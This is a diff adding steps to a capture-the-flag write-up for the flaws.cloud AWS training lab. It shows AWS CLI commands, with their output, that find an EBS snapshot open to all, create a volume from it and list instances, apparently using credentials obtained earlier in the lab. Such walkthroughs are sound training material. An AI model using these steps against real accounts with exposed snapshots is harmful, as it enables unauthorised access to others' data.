@@ -409,6 +409,83 @@ Visit: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
 
 ![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/43633b3a-bbca-4369-851a-58591ffb8a07)
 
+```
+┌─[cwl@RedCloud]─[~/Desktop/level3]
+└──╼ $aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile level3
+{
+    "CreateVolumePermissions": [
+        {
+            "Group": "all"
+        }
+    ],
+    "SnapshotId": "snap-0b49342abd1bdcb89"
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/7b748ecc-2842-47bc-9fa4-c5ef95056738)
+
+Anyone can create a volume based on this snapshot:
+
+```
+┌─[cwl@RedCloud]─[~/Desktop/level3]
+└──╼ $aws ec2 create-volume --region us-west-2 --availability-zone us-west-2a --snapshot-id snap-0b49342abd1bdcb89
+{
+    "AvailabilityZone": "us-west-2a",
+    "CreateTime": "2024-06-04T11:30:43.000Z",
+    "Encrypted": false,
+    "Size": 8,
+    "SnapshotId": "snap-0b49342abd1bdcb89",
+    "State": "creating",
+    "VolumeId": "vol-0885a53d372e754a1",
+    "Iops": 100,
+    "Tags": [],
+    "VolumeType": "gp2",
+    "MultiAttachEnabled": false
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/d48b7e02-bd48-4b0a-9159-cb6228808216)
+
+```
+┌─[cwl@RedCloud]─[~/Desktop/level3]
+└──╼ $aws ec2 describe-volumes
+{
+    "Volumes": [
+        {
+            "Attachments": [],
+            "AvailabilityZone": "us-west-2a",
+            "CreateTime": "2024-06-04T11:30:43.385Z",
+            "Encrypted": false,
+            "Size": 8,
+            "SnapshotId": "snap-0b49342abd1bdcb89",
+            "State": "available",
+            "VolumeId": "vol-0885a53d372e754a1",
+            "Iops": 100,
+            "VolumeType": "gp2",
+            "MultiAttachEnabled": false
+        }
+    ]
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/40dc18ea-9302-477a-945b-d641a4bf4089)
+
+```
+┌─[cwl@RedCloud]─[~/Desktop/level3]
+└──╼ $aws ec2 describe-instances --profile level3 | jq -r '.Reservations[].Instances[].InstanceId'
+i-05bef8a081f307783
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/4dac382f-4135-486d-aa6c-a3ac5ef5f56d)
+
+```
+
+```
+
+
+
+
+
 
 
 
